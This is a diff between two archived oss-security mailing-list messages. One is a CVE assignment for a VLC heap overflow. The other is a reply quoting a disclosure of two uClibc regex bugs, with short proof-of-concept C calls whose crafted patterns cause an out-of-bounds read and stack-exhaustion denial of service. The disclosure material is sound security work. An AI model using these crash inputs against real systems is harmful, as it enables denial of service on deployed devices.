@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2220" "Friday" "16" "June" "2017" "01:21:53" "-0400" "Zach W" "kestrel@trylinux.us" "<01c242ae-3570-c98c-4e29-8b736bd0b1dd@trylinux.us>" "93" "Re: [oss-security] two vulns in uClibc-0.9.33.2" "^Date:" nil nil "6" "2017061605:21:53" "[oss-security] two vulns in uClibc-0.9.33.2" (number mark "        kestrel@tryl Jun 16   93/2220  " thread-indent "\"Re: [oss-security] two vulns in uClibc-0.9.33.2\"\n") "<tencent_18C312B86EA079DA42B11D83@qq.com>" ("<tencent_18C312B86EA079DA42B11D83@qq.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1211" "Wednesday" "30" "March" "2016" "19:20:23" "-0400" "cve-assign@mitre.org" "cve-assign@mitre.org" "<20160330232023.E7D568BC026@smtpvmsrv1.mitre.org>" "32" "[oss-security] Re: CVE request: Heap overflow in VLC 2.1.6 processing wav files" nil nil nil "3" "2016033023:20:23" "[oss-security] Re: CVE request: Heap overflow in VLC 2.1.6 processing wav files" (number mark "U       cve-assign@m Mar 30   32/1211  " thread-indent "\"[oss-security] Re: CVE request: Heap overflow in VLC 2.1.6 processing wav files\"\n") "<CACn5sdTHZPTK7+u1ANCU-T-czJ_vT_-VQp8CisHreKKPAPpazw@mail.gmail.com>" ("<CACn5sdTHZPTK7+u1ANCU-T-czJ_vT_-VQp8CisHreKKPAPpazw@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 32731 invoked by uid 550); 16 Jun 2017 12:43:22 -0000
+Received: (qmail 30133 invoked by uid 550); 30 Mar 2016 23:20:36 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,112 +11,45 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 32181 invoked from network); 16 Jun 2017 05:22:07 -0000
-References: <tencent_18C312B86EA079DA42B11D83@qq.com>
-Message-ID: <01c242ae-3570-c98c-4e29-8b736bd0b1dd@trylinux.us>
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0)
- Gecko/20100101 Thunderbird/52.1.1
-MIME-Version: 1.0
-In-Reply-To: <tencent_18C312B86EA079DA42B11D83@qq.com>
-Content-Type: multipart/alternative;
- boundary="------------379BB0A0BC44874B0419A13C"
-Content-Language: en-US
-Date: Fri, 16 Jun 2017 01:21:53 -0400
-From: Zach W <kestrel@trylinux.us>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] two vulns in uClibc-0.9.33.2
-To: oss-security@lists.openwall.com, fefe <qbenjin@qq.com>
+Received: (qmail 30113 invoked from network); 30 Mar 2016 23:20:35 -0000
+From: cve-assign@mitre.org
+To: gustavo.grieco@gmail.com
+Cc: cve-assign@mitre.org, oss-security@lists.openwall.com
+In-Reply-To: <CACn5sdTHZPTK7+u1ANCU-T-czJ_vT_-VQp8CisHreKKPAPpazw@mail.gmail.com>
+Message-Id: <20160330232023.E7D568BC026@smtpvmsrv1.mitre.org>
+Date: Wed, 30 Mar 2016 19:20:23 -0400 (EDT)
+Subject: [oss-security] Re: CVE request: Heap overflow in VLC 2.1.6 processing wav files
 
---------------379BB0A0BC44874B0419A13C
-Content-Type: text/plain; charset=windows-1252
-Content-Transfer-Encoding: 7bit
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-s/large\ number/nearly\ all/g
+>> https://bugs.launchpad.net/bugs/1533633
 
-Talking millions, not thousands.
+> It is evident that the memcpy operation has an abnormally large size
+> parameter (4290773038).
 
-Zach W.
+Use CVE-2016-3941.
 
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-On 6/15/17 11:53 PM, fefe wrote:
-> I found two vulns in  uClibc-0.9.33.2 (https://uclibc.org/)
->
->
-> one is about line 2682 of get_subexp.c :
->
->
-> 		if (BE (bkref_str_off >= mctx->input.valid_len, 0))
-> 		{
-> 		  /* If we are at the end of the input, we cannot match.  */
-> 		  if (bkref_str_off >= mctx->input.len)
-> 		    break;
->
->
-> 		  err = extend_buffers (mctx);
-> 		  if (BE (err != REG1_NOERROR, 0))
-> 		    return err;
->
->
-> 		  buf = (const char *) re_string_get_buffer (&mctx->input);
-> 		}
-> 	      if (buf [bkref_str_off++] != buf[sl_str - 1])
-> 		break; /* We don't need to search this sub expression
-> 		
-> "bkref_str_off >= mctx->input.valid_len" , when  bkref_str_off == mctx->input.valid_len, "buf [bkref_str_off++] != buf[sl_str - 1]" case Out of one bit bounds read
->
->
-> The poc code like:
-> 	
-> 	if(regcomp (&regtmp,"(.+)upper\\1^", REG_EXTENDED|REG_ICASE | REG_NOSUB )==0)
-> 	{		
->         	reg1match_t pmatch[1];
-> 		regexec(&regtmp, "upperupperupperx",1, pmatch, 0);
-> 		regfree(&regtmp);
-> 	}
->
->
->
->
->
->
-> The another is aout line 1837 of regexce.c :
->
->
-> 		check_dst_limits_calc_pos_1 (const re_match_context_t *mctx, int boundaries,
-> 			     int subexp_idx, int from_node, int bkref_idx)
->                 .......
->
->
-> 		  cpos =
-> 		    check_dst_limits_calc_pos_1 (mctx, boundaries, subexp_idx,
-> 						 dst, bkref_idx);
->
->
-> 		
-> check_dst_limits_calc_pos_1 recursive calls case DDOS, because of stack exhaustion.
->
->
-> The poc code like:	
-> 	
-> 	if(regcomp (&regtmp,"\x28\x2E\x3F\x3F\x28\x2E\x3F\x29\x5C\x42\x44\x3F\x3F\x28\x2E\x5C\x32\x29\x2A\x5C\x32\x28\x2E\x3F\x29\x5C\x32\x29\x2A\x5C\x32\xBD", REG_EXTENDED|REG_ICASE | REG_NOSUB )==0)
-> 	{		
->         	reg1match_t pmatch[1];
-> 		regexec(&regtmp, "\x72\xFF\xFF\xFF\xFF\xBD",1, pmatch, 0);
-> 		regfree(&regtmp);
-> 	}
->
->
->
->
-> A large number of embedded devices uses uclibc instead of glibc.
-> Could you assign CVE id for those?
->
->
-> Thank you
->
->
-> Benjin Liu
-> Codesafe Team of Qihoo 360
-
-
---------------379BB0A0BC44874B0419A13C--
+iQIcBAEBCAAGBQJW/F7oAAoJEL54rhJi8gl5/fsP/0qZaXHxydl6ZJsxaqdac/Dy
+fWVmg594wITgIvtZFpLAZ5pQzGgskboaHJEBcTYkxgQIonJska7QVhNrHSusf2Q5
+ko1T1wkyioQu/en7CFTUBCr2OA5kOiAsSh4Z07zqjJanQHjQ9qvxwjcl+IzhNjJ7
+2ORdJA6NgfseN1m5G7WCos9HqiU+Z7Yah4g9UWkwInBrhU/ehVKAjcLUzH+wFPhQ
+SUx/IQ3hL6fSpY3sAJT2PPhm47Iswt3I6oXmVggMPhJ8rAJmlh51YJhuaPmMKPEI
+hj6X9byGBDhHMEosZzGptDK54Q9nd/CLSjGfW7W0Wzd5o5YOZKzFNgtHhFueCaVv
+CS7pqcmQRzzr6dRiAizjdss7EqJOLmnTGr42ZPQfH5uRg93N1KQyJcmQajkp2YpI
+2yy5hb8wBMfUek/dhCq+VGgwon37pQ46pR++uH3SeYLsmw9EopAKusWlMBqf8CF5
+/2BOHGey+MOKxnGBlGOzMQFseFeOfz1P0DgGvHcn3lOO/YYzmz8Jy94BsabeO58J
+/lnKvbw5rg7/8xYam8x3YKlXrxE1kZvkhr0/FGWL4TvlnRAQg8lNdfaJ+UwJewQ8
+DsJP8RzdLT7Mrwk+WInx3lCN4Gz44F27JvAVxv8KaN/M9ArDPLClUyCfDBMZCq4l
+u70+kK2KhEaAcjYB4cgR
+=SBqA
+-----END PGP SIGNATURE-----
